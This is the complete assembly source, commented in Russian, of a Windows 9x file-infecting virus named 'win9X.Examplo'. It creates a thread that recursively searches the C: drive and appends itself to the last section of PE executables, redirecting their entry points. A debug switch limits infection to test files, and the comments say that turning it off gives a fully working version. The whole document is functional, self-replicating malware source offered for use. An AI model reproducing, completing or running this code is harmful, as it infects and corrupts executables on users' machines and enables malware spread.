
; ---------------------------------------------------------------------------

; win9X.Examplo virus

; ---------------------------------------------------------------------------

; создает нить в контексте текущего процесса, и пока он работает,
; рекурсивно ищет и заражает PE EXE файлы в C:\
; метода заражения -- добавление к последней секции

; ■ для получения бинарной копии:
;   откомпилить с DEBUG=1 и запустить
;   (заражаются только .zom файлы,
;    один такой файл положить в первую по нахождению директорию в C:\)
; ■ для запуска полностью рабочей версии:
;   откомпилить с DEBUG=0 и запустить

; ---------------------------------------------------------------------------

DEBUG                   equ     1       ; 0/1

; ---------------------------------------------------------------------------

include                 consts.inc      ; структуры, константы

; ---------------------------------------------------------------------------

                        p386            ; всегда перед model flat
                        model   flat    ; плоская модель (4 гига и все такое)
                        locals  __      ; локальные метки

                        .data           ; секция данных (чтение/запись)

; ---------------------------------------------------------------------------

virstart:               ; начало вируса

                        db      13,10
                        db      'win9X.Examplo (x) 2000 MAZAFUK Records',13,10
                        db      13,10
virentry:
                        ; выделим место под рабочую копию вируса, в стэке
                        sub     esp, virmemory

                        pusha           ; сохранить все регистры

                        lea     ebp, [esp+32] ; edi = копия вируса в памяти

                        call    __seh_init      ; SEH,
                        mov     esp, [esp+8]    ; Self-Exception Handling,
                        jmp     __seh_error     ; установить обработку ошибок
__seh_init:             push    dword ptr fs:[0];
                        mov     fs:[0], esp     ;

                        call    $+5     ; esi = virstart (текущая копия)
                        pop     esi
                        sub     esi, $-1-virstart

                        mov     edi, ebp  ; edi = новая копия

                        mov     ecx, virsize  ; копируем себя в стэк
                        rep     movsb

                        ; вызываем новую копию
                        lea     eax, [ebp + in_new_addr-virstart]
                        call    eax

__seh_error:            pop     dword ptr fs:[0]  ; убрать обработку ошибок
                        pop     eax               ;

                        popa            ; восстановить все регистры

                        db      0E9h    ; JMP на оригинальную точку входа
oldentry                dd      0

                        jmp     back2loader  ; нужно один первый раз

; ---------------------------------------------------------------------------

in_new_addr:            ; заполнить адреса импортируемых функций
                        ; (таблица двордов imp_addr)
                        call    get_func_names
                        jc      __exit

                        ; создаем новую "вирусную" нить

                        push    eax
                        push    esp ; указатель на получаемый ThreadId
                        push    0   ; флаги
                        push    ebp ; параметр нити = начало вируса
                        lea     eax, [ebp+newthread-virstart]
                        push    eax ; start address
                        push    0 ; stack size. 0==same as in primary thread
                        push    0
                        call    x_CreateThread-virstart[ebp]
                        pop     eax

__exit:                 retn

newthread:              pusha
                        mov     ebp, [esp+32+4] ; параметр == начало вируса

                        ; заразить файлы в текущей директории
                        ; EDI=ff_struc
                        ; EDX=дира
                        sub     esp, size ff_struc
                        mov     edi, esp
                        push    '\:C'
                        mov     edx, esp        ; EDX='C:\',0
                        call    process_directory
                        add     esp, 4+size ff_struc

                        popa
                        retn

; ---------------------------------------------------------------------------

get_func_names:         ; заполнить адреса импортируемых функций

                        lea     esi, imp_name-virstart[ebp]   ; имена импортируемых ф-ций
                        lea     edi, imp_addr-virstart[ebp]   ; адреса функций

__cycle:                call    get_proc_address ; получить адрес функции
                        jz      __error
                        stosd                   ; сохранить адрес

__scan0:                lodsb                   ; поскипать имя, до нуля
                        or      al, al          ;
                        jnz     __scan0         ;

                        cmp     [esi], al       ; нулевое имя -
                        jne     __cycle         ; - конец таблицы имен

__success:              clc
                        retn

__error:                stc
                        retn

; ---------------------------------------------------------------------------

; input:  ESI=имя функции kernel'а (например 'CreateProcessA')
; action: анализ таблицы экспортов kernel'а
; output: ZF=1, EAX=0 (function not found)
;         ZF=0, EAX=function va

get_proc_address:       pusha

                        ; переделайте следующую команду на поиск кернела
                        ; чтобы вирус был не win9X а win32
                        mov     ebx, 0BFF70000h         ; get_kernel_base

                        mov     ecx, [ebx].mz_neptr
                        mov     ecx, [ecx+ebx].pe_exporttablerva
                        add     ecx, ebx

                        xor     edi, edi        ; current index
__search_cycle:         lea     edx, [edi*4+ebx]
                        add     edx, [ecx].ex_namepointersrva
                        mov     edx, [edx]      ; name va
                        add     edx, ebx        ; +imagebase

                        pusha                   ; compare names
                        mov     edi, edx
__cmp_cycle:            cmp     byte ptr [edi], 0
                        je      __cmp_done
                        cmpsb
                        je      __cmp_cycle
__cmp_done:             popa

                        je      __name_found

                        inc     edi             ; index++
                        cmp     edi, [ecx].ex_numofnamepointers
                        jb      __search_cycle

__return_0:             xor     eax, eax        ; return 0
                        jmp     __return

__name_found:           mov     edx, [ecx].ex_ordinaltablerva
                        add     edx, ebx        ; +imagebase
                        movzx   edx, word ptr [edx+edi*2]; edx=current ordinal
                        mov     eax, [ecx].ex_addresstablerva
                        add     eax, ebx        ; +imagebase
                        mov     eax, [eax+edx*4]; eax=current address
                        add     eax, ebx        ; +imagebase

__return:               mov     [esp].popa_eax, eax  ; popa.eax
                        test    eax, eax

                        popa
                        retn

; ---------------------------------------------------------------------------

; subroutine: process_directory
; action:     1. find all files in the current directory
;             2. for each found directory (except "."/"..") recursive call;
;                for each found file call process_file
; input:      EDI=ff_struc
;             EDX=directory name
; output:     none

process_directory:      pusha
                        sub     esp, 1024       ; место под имя директории

                        mov     esi, edx        ; в EDX имя диры
                        mov     edi, esp        ; свой буфер под полное имя

__1:                    lodsb                   ; копируем имя в свой буфер
                        stosb
                        or      al, al
                        jnz     __1

                        dec     edi             ; дира должна кончаться на '\'
                        mov     al, '\'
                        cmp     [edi-1], al
                        je      __3
                        stosb
__3:
                        mov     ebx, edi        ; EBX = указатель на файл

                        mov     eax, '*.*'      ; ищем: дира\*.*
                        stosd

                        mov     edi, [esp+1024] ; восстановим EDI

                        mov     eax, esp
                        push    edi             ; ff_struc, будет заполнена
                        push    eax             ; имя файлов для поиска
                        call    x_FindFirstFileA-virstart[ebp]

                        xchg    esi, eax        ; ESI = хендл поиска

                        cmp     esi, -1         ; че-нить найдено?
                        je      __quit

__cycle:                pusha                   ; добавляем имя файла к дире
                        lea     esi, [edi].ff_fullname
                        mov     edi, ebx
__strcpy:               lodsb
                        stosb
                        or      al, al
                        jnz     __strcpy
                        popa

                        mov     edx, esp        ; EDX = полное найденное имя

                        test    byte ptr [edi].ff_attr, 16  ; дира?
                        jnz     __dir

                        call    process_file    ; обработать файл (EDX,EDI)

                        jmp     __next
__dir:
                        lea     eax, [edi].ff_fullname
                        cmp     byte ptr [eax], '.'    ; skip ./../etc.
                        je      __next

                        call    process_directory       ; рекурсивный вызов

__next:                 push    edi             ; ff_struc, будет заполнена
                        push    esi             ; хендл поиска
                        call    x_FindNextFileA-virstart[ebp]

                        or      eax, eax        ; есть файл?
                        jnz     __cycle

                        push    esi             ; ESI = хендл поиска
                        call    x_FindClose-virstart[ebp]

__quit:                 add     esp, 1024
                        popa
                        retn

; ---------------------------------------------------------------------------

; input: EDX=full filename
;        EDI=ff_struc

process_file:           pusha

                        ; получим расширение файла
                        mov     esi, edx
__scan0:                lodsb
                        or      al, al
                        jne     __scan0
                        mov     eax, [esi-5]
                        or      eax, 20202000h
                        ; проверим расширение -- исполняемое ли оно

IF      DEBUG EQ 1
                        cmp     eax, 'moz.'   ; .zom
                        je      __infect
ELSE
                        cmp     eax, 'exe.'   ; .exe
                        je      __infect
ENDIF

                        popa
                        retn

__infect:               call    infect_file

                        popa
                        retn

; ---------------------------------------------------------------------------

; input: EDX=fullname
;        EDI=ff_struc
;        EAX=extension

infect_file:            pusha

                        mov     esi, [edi].ff_size      ; ESI=длина файла

                        ; ограничим максимальную длину файла
                        cmp     esi, 256*1024
                        jae     __exit

                        ; откроем файл
                        push    0
                        push    80h     ; FILE_ATTRIBUTE_NORMAL
                        push    3       ; 3=OPEN_EXISTING  2=CREATE_ALWAYS
                        push    0
                        push    1+2     ; 1=FILE_SHARE_READ 2=FILE_SHARE_WRITE
                        push    080000000h+40000000h ; GENERIC_READ + GENERIC_WRITE
                        push    edx     ; EDX=имя файла
                        call    x_CreateFileA-virstart[ebp]
                        cmp     eax, -1 ; ошибка?
                        je      __exit
                        xchg    ebx, eax

                        ; выделим нехилый кусок памяти
                        lea     eax, [esi+65536]        ; на 64k больше
                        push    eax                     ; size
                        push    0                       ; 0=GMEM_FIXED
                        call    x_GlobalAlloc-virstart[ebp]
                        xchg    edi, eax                ; EDI=файл в памяти

                        ; считаем весь файл в память
                        push    0
                        push    esp                     ; bytesread
                        push    esi                     ; size
                        push    edi                     ; buf
                        push    ebx                     ; handle
                        call    x_ReadFile-virstart[ebp]

                        ; заразим файл в памяти
                        call    infect_real
                        jc      __close

                        push    0                       ; FILE_BEGIN,от начала
                        push    0
                        push    0                       ; позиция=0
                        push    ebx                     ; хендл
                        call    x_SetFilePointer-virstart[ebp]

                        ; запишем зараженный файл обратно на диск
                        push    0
                        push    esp                     ; bytesread
                        push    esi                     ; size
                        push    edi                     ; buf
                        push    ebx                     ; handle
                        call    x_WriteFile-virstart[ebp]

__close:                ; освободим память
                        push    esi
                        call    x_GlobalFree-virstart[ebp]

                        ; закроем файл
                        push    ebx     ; хендл файла
                        call    x_CloseHandle-virstart[ebp]

__exit:                 popa
                        retn

; ---------------------------------------------------------------------------

; процедура заражает файл, целиком считанный в память

; input:  EDI=буфер с файлом (на 64k больше чем ESI)
;         ESI=длина файла
; output: CF==0 -- файл заражен, ESI=новая длина
;         CF==1 -- ошибка

infect_real:            pusha

                        cmp     [edi].mz_id, 'ZM'   ; check if MZ file
                        jne     __error

                        mov     ebx, edi
                        add     ebx, [ebx].mz_neptr ; EBX = PE header

                        cmp     [ebx].pe_id, 'EP'   ; check if PE file
                        jne     __error

                        test    [ebx].pe_exeflags, 2000h ; dll ?
                        jnz     __error

                        cmp     [ebx].pe_userminor, 'i' ; уже инфицирован?
                        je      __error
                        mov     [ebx].pe_userminor, 'i'

                        ; EAX = размер PE заголовка
                        movzx   eax, [ebx].pe_ntheadersize
                        add     eax, 18h

                        ; EAX = ObjectTable
                        add     eax, ebx

                        ; ecx = (число_секций - 1) * 28h
                        movzx   ecx, [ebx].pe_numofobjects
                        dec     ecx
                        imul    ecx, size oe_struc

                        add     ecx, eax ; ECX=последний элемент objecttable

                        ; вировняем  визическую и виртуальную длины
                        ; последней секции по filealign и objectalign

                        mov     eax, [ebx].pe_filealign
                        dec     eax
                        add     [ecx].oe_phys_size, eax
                        not     eax
                        and     [ecx].oe_phys_size, eax

                        mov     eax, [ebx].pe_objectalign
                        dec     eax
                        add     [ecx].oe_virt_size, eax
                        not     eax
                        and     [ecx].oe_virt_size, eax

                        ; есть оверлей?
                        mov     eax, [ecx].oe_phys_offs
                        add     eax, [ecx].oe_phys_size
                        cmp     eax, esi                ; ESI=длина файла
                        jne     __error

                        ; последняя секция:
                        ; физ. длина не должна быть больше виртуальной
                        mov     eax, [ecx].oe_phys_size
                        mov     edx, [ecx].oe_virt_size
                        cmp     eax, edx
                        ja      __error
                        ; и ни одна из них не должна быть нулевой
                        or      eax, edx
                        jz      __error

                        ; сохраним оригинальную точку входа

                        mov     eax, [ecx].oe_virt_rva
                        add     eax, [ecx].oe_phys_size
                        add     eax, oldentry+4-virstart
                        sub     eax, [ebx].pe_entrypointrva
                        neg     eax
                        mov     oldentry-virstart[ebp], eax

                        ; установим новую точку входа
                        mov     eax, [ecx].oe_virt_rva
                        add     eax, [ecx].oe_phys_size
                        add     eax, virentry-virstart
                        mov     [ebx].pe_entrypointrva, eax

                        ; копируем вирус в файл (в копию файла в памяти)
                        pusha
                        add     edi, esi        ; ==buf+bufsize
                        mov     esi, ebp        ; ==virstart
                        mov     ecx, virsize
                        cld
                        rep     movsb
                        popa

                        ; вычислим длину вируса, выровненную на objectalign
                        mov     edx, virsize
                        mov     eax, [ebx].pe_objectalign
                        dec     eax
                        add     edx, eax
                        not     eax
                        and     edx, eax

                        ; правим PE-заголовок и запись о последней секции

                        add     [ebx].pe_imagesize, edx
                        add     [ebx].pe_sizeofcode, edx

                        add     [ecx].oe_virt_size, edx

                        ; вычислим длину вируса, выровнянную на filealign

                        mov     edx, virsize
                        mov     eax, [ebx].pe_filealign
                        dec     eax
                        add     edx, eax
                        not     eax
                        and     edx, eax

                        ; правим запись о последней секции
                        add     [ecx].oe_phys_size, edx

                        ; увеличим длину файла
                        add     [esp].popa_esi, edx

__success:              clc
                        popa
                        retn

__error:                stc
                        popa
                        retn

; ---------------------------------------------------------------------------

imp_name:               ; имена импортируемых вирусом функций
                        db      'FindFirstFileA',0
                        db      'FindNextFileA',0
                        db      'FindClose',0
                        ;;
                        db      'CreateFileA',0
                        db      'SetFilePointer',0
                        db      'ReadFile',0
                        db      'WriteFile',0
                        db      'CloseHandle',0
                        ;;
                        db      'GlobalAlloc',0
                        db      'GlobalFree',0
                        ;;
                        db      'CreateThread',0
                        db      0

; ---------------------------------------------------------------------------

                        align   4
virsize                 equ     $-virstart      ; длина вируса

; ---------------------------------------------------------------------------

imp_addr:               ; адреса импортируемых вирусом функций
x_FindFirstFileA        dd      ?
x_FindNextFileA         dd      ?
x_FindClose             dd      ?
                        ;;
x_CreateFileA           dd      ?
x_SetFilePointer        dd      ?
x_ReadFile              dd      ?
x_WriteFile             dd      ?
x_CloseHandle           dd      ?
                        ;;
x_GlobalAlloc           dd      ?
x_GlobalFree            dd      ?
                        ;;
x_CreateThread          dd      ?

; ---------------------------------------------------------------------------

                        align   4
virmemory               equ     $-virstart      ; длина вируса

; ---------------------------------------------------------------------------

                        .code           ; секция кода (только чтение)
loader:
                        call    virentry
back2loader:
                        push    5*1000           ; пауза 5 секунд
                        extern  Sleep:PROC
                        call    Sleep

                        push    -1               ; exitcode
                        extern  ExitProcess:PROC
                        call    ExitProcess      ; выход из программы

                        end     loader  ; loader -- точка входа в программу

; ---------------------------------------------------------------------------
